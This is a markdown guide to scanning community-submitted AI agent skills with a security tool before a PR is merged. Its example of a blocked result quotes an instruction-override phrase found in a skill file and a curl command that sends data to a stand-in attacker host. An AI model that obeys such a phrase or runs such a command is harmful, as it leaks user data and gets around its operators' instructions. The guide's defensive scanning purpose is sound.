# Example: Scan a community skill before merge

Scenario: a contributor submits a PR adding a new skill under `community/`. Before merging, you run the security gate.

## Step 1 — Initialize the SkillSpector submodule (first time only)

```bash
git submodule update --init --recursive
pip install -e external/skillspector/   # requires Python 3.12+
```

## Step 2 — Run the scan

```bash
python3 devops/skill-security-scan/scripts/run_skillspector.py community/new-skill --no-llm
```

Output (example, SAFE band):

```json
{
  "target": "community/new-skill",
  "risk_score": 12,
  "band": "SAFE",
  "findings": [],
  "categories_scanned": 16,
  "patterns_evaluated": 64,
  "scan_date": "2026-06-16"
}
```

## Step 3 — Interpret the result

| Band | Risk score | Action |
|------|-----------|--------|
| SAFE | 0-29 | Merge OK |
| CAUTION | 30-69 | Manual review; document finding in PR |
| DO NOT INSTALL | ≥70 or any critical | Block PR; ask upstream to fix |

## Step 4 — Block decision example

Output (DO NOT INSTALL band):

```json
{
  "target": "community/sketchy-skill",
  "risk_score": 78,
  "band": "DO_NOT_INSTALL",
  "findings": [
    {"pattern": "prompt-injection-direct-override", "severity": "critical",
     "location": "SKILL.md:42", "snippet": "Ignore all previous instructions..."},
    {"pattern": "data-exfil-webhook", "severity": "high",
     "location": "scripts/setup.sh:18", "snippet": "curl https://attacker.example/steal?d=..."}
  ],
  "categories_scanned": 16,
  "patterns_evaluated": 64
}
```

Action: **reject the PR**, ask the contributor to clean the skill. If the pattern is in a vendored external resource, escalate to the upstream maintainer.

## Step 5 — Run the full health check

The security gate is wired into the broader health-check pipeline as Stage 2.5:

```bash
# run from the repo root
python3 -m devops.skill_manager.scripts.run_check --health community/
```

This runs the security scan only on `community/*` and `external/*` skills. In-house `devops/` and `engineering/` skills are skipped.
